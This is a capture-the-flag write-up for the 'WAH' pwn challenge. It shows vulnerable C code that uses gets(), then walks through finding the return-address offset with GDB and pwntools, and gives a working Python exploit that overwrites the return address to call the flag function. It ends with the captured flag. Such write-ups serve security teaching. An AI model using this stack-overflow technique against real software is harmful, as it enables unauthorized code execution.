# WAH - Pwn

## Challenge description
> Baby friendly!

Source code:
```C
#include <stdio.h>
#include <stdlib.h>

void flag(){
    char flag[128];
    
    FILE *file = fopen("flag.txt","r");
    if (!file) {
        puts("Error: missing flag.txt.");
        exit(1);
    }

    fgets(flag, 128, file);
    puts(flag);
}


int main(){
    setbuf(stdout, NULL);
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    
    char cry[24];

    printf("Cry: ");

    gets(cry);
    return 0;
}
```
## Solution
We need to find a way to call the ```flag``` function, first let us note that PIE (Position Independent Executables) is disabled:

![Screenshot from 2022-05-09 15-01-06](https://user-images.githubusercontent.com/54234250/167407366-54f8466f-526b-4dc9-bb95-0a8afcd3af91.png)

which means we can just note the address of the ```flag``` function and use it later, because it is constant.
I used ```GDB``` to get the address of the ```flag``` function:

![Screenshot from 2022-05-09 15-15-17](https://user-images.githubusercontent.com/54234250/167407885-9b048e38-6bc3-4551-9673-f09fcb8eeade.png)

address of flag function : ```0x0000000000401236```.
Next, I had to find the offset from the ```cry``` buffer to the ```RIP``` register, you can test it manually using gdb (I use gdb-pwndbg).

Let's set a breakpoint after the ```gets``` function:

![Screenshot from 2022-05-09 15-47-10](https://user-images.githubusercontent.com/54234250/167412867-fad97ee5-d585-44c8-88f9-b528b30140aa.png)

I will use the command ```cyclic 100``` from pwntools to generate a payload that will be easier to find the offset with, we received the following payload: ```aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa```.

![Screenshot from 2022-05-09 15-50-26](https://user-images.githubusercontent.com/54234250/167413423-2d1d9d93-4360-4126-b907-6953a87eb7cf.png)

From the picture above, we can see that the sequence ```aaal (0x6161616c)``` overwritten the return address, we can use ```cyclic -l aaal``` to retrieve the offset which is ```40```.

Now we can write a script to override the return address with the address of the ```flag``` function:
```python
from pwn import *

r = remote("challs.actf.co", 31224)

context.log_level = 'debug'

# 0x401236 - address of flag function
r.sendlineafter(b':', b'a'*40 + p64(0x401236))

# print response from server
print("\n" + r.recvall().strip().decode())
```
> actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}
